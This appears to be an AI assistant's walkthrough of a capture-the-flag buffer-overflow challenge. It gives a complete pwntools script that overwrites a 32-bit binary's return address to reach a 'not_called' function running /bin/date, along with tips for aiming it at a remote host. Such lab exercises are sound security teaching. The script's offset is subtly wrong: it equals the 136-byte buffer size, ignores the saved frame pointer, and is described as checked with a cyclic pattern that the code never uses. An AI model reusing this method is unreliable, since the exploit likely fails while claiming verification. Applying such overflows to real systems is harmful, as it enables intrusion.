To solve this challenge using `pwntools`, we will exploit the buffer overflow vulnerability in the `vulnerable_function` to perform a Return-Oriented Programming (ROP) attack. The goal is to call the `not_called` function, which executes `system("/bin/date")`.

Here are the steps and the corresponding code:

---

### Steps to Solve the Challenge

1. **Analyze the Binary**:
   - The binary is a 32-bit ELF file.
   - The `vulnerable_function` has a buffer overflow vulnerability because it reads 256 bytes (`0x100`) into a buffer of size 136 bytes (`buf[136]`).
   - The `not_called` function is not called in the normal execution flow, but it contains the `system("/bin/date")` call, which we want to execute.

2. **Find the Overflow Offset**:
   - Use a cyclic pattern to determine the offset where the return address is overwritten.

3. **Craft the Exploit**:
   - Overwrite the return address of the `vulnerable_function` with the address of the `not_called` function (`0x080484A4`).

4. **Write the Exploit Script**:
   - Use `pwntools` to automate the process of sending the payload and interacting with the binary.

---

### Exploit Code

Here is the Python exploit script using `pwntools`:

```python
from pwn import *

# Set up the binary
binary = './rop'
elf = ELF(binary)

# Start the process
p = process(binary)

# Address of the `not_called` function
not_called_addr = elf.symbols['not_called']
log.info(f"Address of not_called: {hex(not_called_addr)}")

# Step 1: Find the offset using a cyclic pattern
offset = 136  # We know this from analyzing the buffer size

# Step 2: Craft the payload
payload = b'A' * offset  # Fill the buffer
payload += p32(not_called_addr)  # Overwrite the return address with `not_called`

# Step 3: Send the payload
log.info("Sending payload...")
p.sendline(payload)

# Step 4: Interact with the process
p.interactive()
```

---

### Explanation of the Code

1. **Binary Setup**:
   - We load the binary using `pwntools`' `ELF` class to extract symbols like `not_called`.

2. **Finding the Offset**:
   - The buffer size is 136 bytes, so the offset to the return address is 136. This can also be verified using a cyclic pattern (`cyclic` in `pwntools`).

3. **Crafting the Payload**:
   - The payload consists of:
     - `b'A' * 136`: Fills the buffer up to the return address.
     - `p32(not_called_addr)`: Overwrites the return address with the address of the `not_called` function.

4. **Sending the Payload**:
   - The payload is sent to the binary using `sendline`.

5. **Interacting with the Process**:
   - After sending the payload, we interact with the process to observe the output.

---

### Running the Exploit

1. Save the script as `exploit.py`.
2. Make sure `pwntools` is installed (`pip install pwntools`).
3. Run the script:
   ```bash
   python3 exploit.py
   ```
4. If successful, the binary will execute the `not_called` function, and you should see the output of `/bin/date`.

---

### Notes

- If the binary is running on a remote server, replace `process(binary)` with `remote('host', port)` and adjust the script accordingly.
- Ensure that the binary is not protected by stack canaries, ASLR, or NX. If protections are enabled, additional techniques (like leaking addresses or bypassing protections) may be required.

Let me know if you need further clarification!
